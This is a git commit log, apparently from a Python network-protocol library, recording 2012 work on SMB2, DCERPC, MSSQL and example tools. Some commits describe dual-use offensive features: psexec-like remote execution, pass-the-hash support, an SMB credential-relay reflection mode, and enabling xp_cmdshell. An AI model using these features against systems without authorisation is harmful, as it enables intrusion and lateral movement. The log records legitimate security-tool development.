Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Aug 14 23:47:36 2012 +0000

    1) Added isGuestSession()
    2) Added getServerIP()
    3) Backward compatible list_shared(), connect_tree, get_remote_host

commit 19840a88b2db384394de4dbc387fc886f8b79817
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Aug 14 23:21:48 2012 +0000

    Initial implementation of SMB version 2 and 3 protocol [MS-SMB2].
    1) Signing support for SMB2 done (SMB3 not yet, as well as encryption)
    2) Commands implemented:
    SMB2_NEGOTIATE
    SMB2_SESSION_SETUP
    SMB2_LOGOFF
    SMB2_TREE_CONNECT
    SMB2_TREE_DISCONNECT
    SMB2_CREATE
    SMB2_CLOSE
    SMB2_FLUSH
    SMB2_READ
    SMB2_WRITE
    SMB2_LOCK
    SMB2_IOCTL
    SMB2_CANCEL
    SMB2_ECHO
    SMB2_QUERY_DIRECTORY
    3 left to go.
    3) DCERPC over SMB2 should work, if you change smb.SMB for smb3.SMB3 in transport (and import smb3)
    
    We'll do a SMB protocol factory in the future to make it all transparent to the user.

commit 2552e57fed56433c141fa77b9d98bb8e011d88b8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Aug 14 22:49:24 2012 +0000

    Added TransactNamedPipeRecv() to smb.py as it's being used by transport.py. This is to isolate anything related to SMB1 from the DCERPC layer... (guess why? :P )

commit 0d76f992ce02c3e8500bd60f6f4f6c065a922e93
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 13 18:44:04 2012 +0000

    Forgot to remove the higher bits on the lower side of length field

commit 6b0b2eec7fd2c841b8d2f6f79d1b4be740ba24a8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 13 17:01:23 2012 +0000

    For NETBIOS_SESSION_MESSAGE the size of the message is 3 bytes long, using the flags byte

commit 04f6b3256049183b1150943f428507ae883a5291
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 11 16:49:49 2012 +0000

    Just ordering the imports

commit 68a36eb68a578ee1d88bcacaf5722da3b1188458
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Aug 9 16:56:32 2012 +0000

    Binary compiled with VC2008 so it can work on Windows 2000 boxes

commit a1329d587172dba033653da58e7975772cd03872
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Aug 9 16:54:12 2012 +0000

    Sleeps while waiting for the pipe to be ready. Set a max tries of 50

commit f5c72ebb022f3095508b86041baf1181ccacf6dc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Aug 9 16:21:28 2012 +0000

    Increased the amount of bytes substracted for chunk_size to make it safer, doesn't look like it was enough for Windows 2000

commit 17870a41e3657b38ce220cabd1c7732991c96e8c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Aug 7 14:30:07 2012 +0000

    If we know the serverName, use it for the path to the service, if not, just stick 127.0.0.1 and hope for the best.

commit 9ab7ae576e5bdbed7e2ce72f99279e3192fc6f00
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 6 21:49:56 2012 +0000

    Added -file option.. allowing to upload an specific RemComSVC compatible file

commit c6a052224f6d1130ff93bdc485c067935b9209e8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 4 19:36:18 2012 +0000

    Now it also print the Interface Provider (the exe/dll file holding the typedef)

commit 9dc37f96af6b6fa4eeb001b24837528aaa041ef8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 4 19:35:30 2012 +0000

    Updated KNOWN_UUIDS

commit d578b42a1c9d8b860b7d7cd54157776c4999811e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 3 14:01:11 2012 +0000

    A few more UUIDS

commit 4b0ff106fd3eb21ea6a7e80d569689abb4e794cd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Aug 2 12:16:43 2012 +0000

    More updates on the KNOWN_PROTOCOL dict

commit b3eb3eaf9ab6df033015ddef038c08df16fd33a4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 1 19:28:52 2012 +0000

    A much better way to show and endpoint mapper output (IMHO). Now grouped by the Interface IDs

commit be278a142fcc1c4845c6cdd191db2861806e8bb4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 1 17:55:02 2012 +0000

    It now shows the protocol associated with the Interfase ID, if possible

commit 8b10b7920c2bebec6d6b3b4c24190e7a9e5c22bd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 1 17:52:49 2012 +0000

    Added KNOWN_PROTOCOLS dictionary.. I parsed all the Windows Protocol Specification looking for the UUIDs used. This could be helpful when reading a portmap output

commit 703a6815cf20652364bcde87c6e8e597eadb3f86
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 31 22:05:14 2012 +0000

    A simpler and faster version of rpcdump, using the new lookup call

commit 182545a341cb4bbfc35f8ff48966360ee7dd757a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 31 18:32:59 2012 +0000

    pump up version to 1.0-dev

commit 8eff6ce2722924c527796a555a8773c4b8090da2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 31 17:27:56 2012 +0000

    Forgot to remove forcing inquireType to be all endpoints.. now it honors the method parameter

commit 437091d68db03d1216f7f939ee2f69ba09f146b8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 30 23:40:39 2012 +0000

    PrintStringBinding() method added.. basically same code we had before but converted to Structure like code

commit 66793d1f1f7a53ce735f008e88377e49f55be54e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 30 22:15:28 2012 +0000

    Added portmap lookup function using Structure. It can work as a general portmapper, or just to find specific interfaces/objects.
    But most important, it doesn't grab records one at a time (as the previous implementation), but get them all and the parses the results. Way faster than before.
    Old code left there for backward compatibility.
    Still gotta finishing printing friendly the results

commit f8dcd5514a23eb4a9e47ee8c628b6ff4c9294161
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 30 19:54:19 2012 +0000

    Some clarification comments based on [MS-RPCE]

commit ac130e8bf0bf0b7bf98e7618d9f4420f9fd537b9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 26 22:18:33 2012 +0000

    1) Fix bug when passing hashes, there weren't being converted to binary hence it wasn't working

commit 7e422881d578484d94b9ee05d46e3a0f5f504990
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 24 16:43:04 2012 +0000

    [MC-SQLR] example. Retrieves the instances names from the target host

commit 2e692c3cfb4105811e066983049ba71c3baf5a1f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 23 18:05:18 2012 +0000

    Added commands to the shell:
    1) lcd {path}                 - changes the current local directory to {path}
    2) enable_xp_cmdshell         - you know what it means
    3) disable_xp_cmdshell        - you know what it means
    4) xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    5) ! {cmd}                    - executes a local shell cmd
    
    Just to show what can be done..

commit 6c37c911075b748d97b0f6852e52930ed6c55237
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 23 17:59:25 2012 +0000

    1) Changed printRows, now it mimics what a osql client does ( I don't know if I like it more or less)
    2) ENVCHANGE now specifies what changed (DATABASE, PACKET SIZE, ETC)
    3) Added new types, dates should be shown well now.. decimal as well. Only important one left is SQLVariant

commit 47f51877eaa8367f5af2e2623b147564ab1390be
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 22 18:20:28 2012 +0000

    Now it shows TDS_NUMERICNTYPE most of the times :)

commit 1a0ed117f1a08b98d356a32508303d9beb99b144
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 21 23:08:49 2012 +0000

    Added -file option to specify a file with commands

commit 6a8373c79501f89febe82bbb1ae02ed2dd6af4f7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 21 22:56:55 2012 +0000

    Fixed bug in NTEXTTYPE, weren't adding the right amount of bytes to advance in the buffer (2 instead of 4)

commit 7c45e66a86fc174a2c8fe6856ead554b537c4a18
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 21 22:42:28 2012 +0000

    Added TDS_NUMERICNTYPE parse in parseRow(), still have to print it the right way. Now just printing a warning message

commit 8dde582908d9db9d1cff5cc09d3ba84574cff9e0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 21 21:38:10 2012 +0000

    Don't get into the SQL Shell if auth failed

commit 205135a8bb8a1c403b89eb18189f71b1c06165ad
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 21 01:44:01 2012 +0000

    self.colMeta must be clean every time we parse colMetaData

commit 644c6cb52ba8d4d6b1abf410ec3c55c238e14cf6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 21 01:21:29 2012 +0000

    TDS_NUMERICNTYPE size is just 1 byte (inside parseRow)

commit 73fa99559391f2cde06fad1e7b8a807823e8833d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 21 00:09:28 2012 +0000

    GUIDs can be NULL :s

commit 89484cdfe2f90874eee7fb383a70cd1260891ffd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 21 00:04:43 2012 +0000

    Added TDS_RETURNSTATUS_TOKEN and TDS_DONEPROC_TOKEN

commit dfeaa4e75ad891560abf5e189da072b85541db41
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 20 23:53:06 2012 +0000

    Support for TDS_GUIDTYPE in parseRow

commit 9c52f905279db165969d8204705b2bd472f322a1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 20 23:40:40 2012 +0000

    Oops.. w/o printing the error

commit c2594c95f2c03736bec07a1635a011fb9c35abe7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 20 23:39:51 2012 +0000

    Don't exit if something goes wrong

commit cba4a5862e5d1703071e7742f267f7d2713c4fc6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 20 20:53:05 2012 +0000

    Windows auth by default is False

commit 931a714a65d6b3973e6f5bb7cc303eccab936d00
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 20 20:51:48 2012 +0000

    A simple MSSQL client

commit 6a741a350aeeb321e258ffbcb500521ca1c19a7c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 20 20:50:25 2012 +0000

    Initial implementations of the TDS protocol so we can talk with a target MSSQL Server.
    It supports MSSQL and Windows Auth.
    See the mssqlclient.py under the examples

commit 1dca21e47ca242c584cc099a17a948912a2da023
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 18 13:13:22 2012 +0000

    Updated setup.py

commit 7bbd07faa998cf279a6e6af21ec48a0ef29be425
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 18 13:11:10 2012 +0000

    Clarifications on the need of using the srvsvcserver

commit 0b71d0e80de3e72f2b4ed537060ab717d0d409f6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 15 19:25:01 2012 +0000

    Support for large files in READ_ANDX and WRITE_ANDX

commit 08ea2274a7043b62d778a8e32867dd3a1a8b9492
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 15 06:26:46 2012 +0000

    Added -file command line option allowing to specify a file with commands to execute. E.g.
    cat > cmds.txt
    open 192.168.53.146
    login user1 pwd1
    shares
    use admin$
    cd Web
    cd Wallpaper
    ls
    put myfile
    
    python smbclient.py -file cmds.txt

commit 0e862171aa7c401e5deea0016bb3f53e40c853a7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 15 03:00:54 2012 +0000

    Exposing a getShare() method used by psexec

commit 9f0021ff277f08daf6000943060e92e2dc13abff
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 15 02:59:58 2012 +0000

    Ability to download/upload files from the shell session. Could be kind of confusing at first but I'm sure it's gonna be useful to somebody :P

commit 66db493223f9d27b431dd0f1975569748d0b6874
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 14 23:53:54 2012 +0000

    Now smbrelayx uses serviceinstall helper library... Much simpler

commit 5d74ec93796baf422c47f36993804cb3635ec2dc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 14 23:07:54 2012 +0000

    IPv6 ping example

commit c9b8411586d2cf3e89c5188cbb2c694c7aabe7a7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 14 15:54:14 2012 +0000

    Under some circumstances, opening multiple simultaneous connections to the target host might make the server to reset some of them. Looks like opening them sequentialy solves this problem. I added a lock on each thread so once they release the lock lets the next one opening the next connection. This seems to solve this rare issue

commit da57bdc4d5b33997a54e4f9560513573a2f3cfb9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 13 19:40:41 2012 +0000

    Added a RemoteShell class that allows implementing some commands on top of the shell being running (currently only lcd and '!').
    
    Better control of some error situations.

commit 0863f23a244526343ed26134537eb0d2899f1d19
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 12 16:33:04 2012 +0000

    Don't fail if we don't specify a credentials file (we're not using it right now)

commit 26515dd76df20cc1fb657d0d76650f5bfa0033ea
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 12 16:22:04 2012 +0000

    In the situation where something fails inside a try:.. finally will get the wrong tid, setting to the correct one

commit 97817fc1d10e9a20a1a09a58459cc09d756fc1b1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 23:54:59 2012 +0000

    1) Parameters are parsed with argparse
    2) Added domain and hashes support

commit c987cf7d1439aa8b40244368defd2b64309500e5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 19:39:46 2012 +0000

    Removed debug msg

commit 8bf973f914effc1e54aebc613fa663398c3a2a21
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 19:39:14 2012 +0000

    1) Parameters are parsed with argparse
    2) Added domain and hashes support

commit 02f502b266739ea475f76780863bd3cb9c0fc70b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 19:12:55 2012 +0000

    1) Parameters are parsed with argparse
    2) Added domain and hashes support

commit 5405bb444113dc330f5c418f399d3dd34fd7f74e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 17:51:30 2012 +0000

    1) Catches exception when connecting and exiting gracefully
    2) Threads honor the destination port given by the user (either 445 or 139)

commit 0e181e400b9b5166eba966f8ab376b7ec209a358
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 16:55:44 2012 +0000

    Showing help by default

commit 7c1e7b40efeacc760652d2078af0b8f2e1f8baa5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 16:48:20 2012 +0000

    Showing help by default. Default transport is 445/SMB

commit 4120e1178808a316b838cda27ff66e50363f721c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 16:45:20 2012 +0000

    Showing help by default. Default transport is 445/SMB

commit 557943ab22f83f9b473cce92373fba41bfbc571f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 16:42:50 2012 +0000

    Showing help by default. Default transport is 135/TCP

commit 3bc1bfe317a76317b02c277d3dc91ebd0a0001b1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 16:37:01 2012 +0000

    psexec like example using RemComSvc (https://github.com/kavika13/RemCom)

commit 0ab8226c9b412926420f7f3858e015c3ebc3bc6a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 16:34:47 2012 +0000

    These are helpers to be used by the examples provided.
    
    remcomsvc: delivers the binary of the remcomsvc to be used for remote execution
    serviceinstall: helper to install/uninstall services

commit cc630748b93c49ad0f3c3b43c3e9d8850d903f8c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 10 14:16:54 2012 +0000

    Added domain and hashes support

commit 821cef87b7f4faae3480143606fe31cee2ce4f1a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 10 14:09:48 2012 +0000

    Added domain and hashes support

commit f45d28d4cdae235f9aa7e4aef6a56e24740e5c05
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 10 13:58:10 2012 +0000

    Added domain and hashes support

commit 2c8a5bf41302e6289d0ea3c2fb803da8eadf847c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 8 22:19:26 2012 +0000

    Remaining was wrongly calculated.. the original buffer's size must be there (I had to substract the 2 additional bytes when sending in pipe_mode)

commit c8a651797e44c6f359c03c1af97d2d11a5f605ef
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 8 21:38:17 2012 +0000

    1) MaxBufferSize now set to the recommended by MS-CIFS (61440)
    2) Implemented WaitNamedPipe call
    3) write_andx now supports a write_pipe_mode that requires sticking to MaxBufferSizes besides the capabilities set by the server

commit c6c6a0cd3cee8f64ac5f664d8fbaf2a3deba1bdc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 8 04:44:34 2012 +0000

    Fixing padding calculation for NT Transact

commit 734b5cdfd032f25a6f2b6f68c93306efa2cc7d8a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 6 20:36:54 2012 +0000

    1) Putting deprecation warnings on __raw_retr_file and __raw_stor_file methods
    2) Raw methods eliminated from stor_file() and retr_file()

commit 53847d097ca8047e4edc20cf415bb5b8b917c23e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 4 19:49:59 2012 +0000

    Added SMB_FIND_FILE_NAMES_INFO info level to findfirst2

commit 9a2fa5c2424c1df9e9d16d50808a220ee877e1c8
Author: jigermano@gmail.com <jigermano@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 3 20:46:35 2012 +0000

    Added partial support for TCP SACK (support for 1 block only)

commit 5f5bd8b07f486a87aacb014a36e01ab5edae5c92
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 29 19:16:11 2012 +0000

    Service Type can be many types

commit f3b3017e7c6c257c5e98693f39dd0c0738a98644
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 26 16:55:13 2012 +0000

    1) Added use_timeout() context_manager method.
    2) Added deprecation warning for tree_connect(), clients should use tree_connect_andx()

commit 59b931d373e1325ee75e3bdc5fe91bd9f582e12c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 26 12:59:30 2012 +0000

    Better error support and status reporting

commit 99fa62bc2dd7fd2c90a08b7b73eff34472d9f81e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 26 00:42:49 2012 +0000

    No need to have a '-m' switch.. can be infered whether or not a host is specified.

commit c03b0707aa22f7dc690b292daf16dfaaeb36da86
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 26 00:31:18 2012 +0000

    Better error support and status reporting

commit a9a0586fe2a765eb0642eac81cea8bd328036dca
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 24 21:27:07 2012 +0000

    1) Added create service option
    2) Arguments' parsing now handled by argparse

commit 5aeb21bf41771586f3434dc57bc3c3793ee5cd31
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 24 19:39:05 2012 +0000

    Using argparse for program's argument parsing

commit 29c06e14650c5b3b69388691196a3191abb7dc50
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 24 06:21:25 2012 +0000

    1) Added reflection mode, to relay credentials to the caller host (fixed in MS08-068)
    2) Program arguments now handled by argparse

commit b236b79627b09b189e55f31ca47a83e4bc204a4b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 24 06:17:30 2012 +0000

    Added version file used by the examples

commit 1bcc9010136d3d71f46827baff19e9566b9fe285
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 23 22:17:33 2012 +0000

    Parses a pcap file or sniffes traffic from the net and checks the SMB structs for errors.  Log the error packets in outFile. Still lots to do

commit 55feb029a413ea5de9b68ce50611f18e77838a9e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 23 22:09:30 2012 +0000

    Prints whether or not a USER or GUEST session (SFS) was granted

commit 4b5a523d6f8690f018ce30bea8e72e10d30889f8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 23 22:07:40 2012 +0000

    Added LsarLookupSids3() call

commit b65d75c3950776f9949276e40aa60044b498effb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 23 22:06:10 2012 +0000

    Added rpc_fault_cant_perform DCERPC error

commit 91cdd87c4a7d290d35a85c970bf50f484d0c7f08
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 22 23:33:36 2012 +0000

    I just saw an answer from a server that doesn't have the reserved field in zero (contrary to the protocol specification). Since it's not used, we're just letting the structure to hold whatever value is received.

commit 7ddb494c04ce2867c333d48829c9751358775f4c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 21 18:50:46 2012 +0000

    At logoff, receive the servers's answer and clear the uid field, in case client wants to login again using the same connection

commit 255f7a802a05182b044b95a7c34fb873df518439
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 21 15:39:40 2012 +0000

    If we change to a different share, clear the pwd local variable

commit abf579ccd0a288ca780a23c0434e84814cf8c114
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 15 20:00:07 2012 +0000

    Added get_timeout() method to the SMB class

commit 5b6667f4a198e3114cbf14fe9cac4c9b74db6e61
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 9 05:45:33 2012 +0000

    Fix typo on all SMBSessionSetupAndX* definition. Unicode ('u') must be used instead of NDR ('w').

commit 61c7a29157fd2d2ab3683f63112e32285f1de8a5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 2 01:22:08 2012 +0000

    Just making the example to work

commit d13b6c58b49fa0e55129baa37f04eecadb222f18
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 2 00:33:57 2012 +0000

    Removed parsing data inside the payload of a SMBNTLMDialect_Data(). I added this in revision 294, but triggers an exception on some weird Windows configurations. ServerName is grabbed later on at the login stage, in a much safer way.

commit 509aa4bd585289ce69887c6b455c4304e3fea7e2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri May 25 05:17:13 2012 +0000

    1) Missing '<' in LSARPCLookupSids'd LookupLevel Field
    2) Added LSARPCLookupSids3 structure

commit 357c11ec7f02310f42832275587c7e763b1cbe2b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 22 13:56:36 2012 +0000

    Example now grabs the Scheduled tasks through SchRpcEnumTasks(), much better since it will grab them all (contrary to the old NetrJobEnum() ). Example yet not fully functional, just committing for backup

commit 7bae66d5edf82ca2860bf01d7fc3197066a9cd8d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 22 13:51:39 2012 +0000

    1) Fixed bug in MSRPCBindAck when SecondaryAddrLen is 0, SecondaryAddr should be optional
    2) When doing alter_ctx, keep track of the previous callid

commit 1ac3783599ac71e3581909630c14312c9ae42e91
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 22 04:01:28 2012 +0000

    if SMBTransport.disconnect() is called, and no previous smbserver was provided to the transport, clear self.__smb_server, in case a new SMBTransport.connect() is wanted

commit 82a21e94a7409fc136d61181b3821f8c05ab5887
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 22 03:28:17 2012 +0000

    Added Method SchRpcEnumTasks()

commit e778256d6514680657aedd4d6b48bb90b754e327
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 22 01:12:17 2012 +0000

    Example for the ATSVC dcerpc methods. So far it:
    1) Creates an schedule task
    2) Enums the tasks created for the user

commit ee81a9c3a21fb65525c7632df507437ee710060a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 22 01:10:13 2012 +0000

    First implementation of the ATSVC ([MS-TSCH]) methods:
    1) NetrJobAdd()
    2) NetrJobEnum()

commit 7a78b6a41bfcb235c723ee1dbc42ea1889e2d012
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 20 23:16:59 2012 +0000

    Small example for SPOOLSS, now it's only enumerating printers (Level1)

